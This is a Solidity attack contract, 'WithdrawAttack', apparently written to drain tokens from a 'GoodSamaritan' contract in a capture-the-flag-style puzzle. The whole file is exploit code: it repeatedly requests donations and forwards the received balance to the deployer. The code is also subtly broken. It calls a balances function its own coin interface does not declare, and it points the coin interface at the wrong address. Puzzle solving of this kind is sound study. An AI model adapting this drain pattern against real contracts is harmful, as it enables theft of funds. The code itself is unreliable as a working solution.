pragma solidity ^0.8.0;

interface GoodSamaritanI {
    function requestDonation() external;
}

interface CoinI {
    function transfer(address dest_, uint256 amount_) external;
}

contract WithdrawAttack {
    GoodSamaritanI public immutable goodSamaritan;
    address public immutable owner;
    CoinI public immutable coin;

    constructor (address goodSamaritanInstance) {
        goodSamaritan = GoodSamaritanI(goodSamaritanInstance);
        owner = msg.sender;
        coin = CoinI(goodSamaritanInstance);
    }

    function notify(uint256 amount) external {
        // First, transfer our balance to the player
        uint256 balance = coin.balances(address(this));
        if (balance > 0) {
            coin.transfer(owner, balance);
        }
        // Then continue donation by requesting again
        goodSamaritan.requestDonation();
    }

    function attack() public {
        goodSamaritan.requestDonation();
    }
}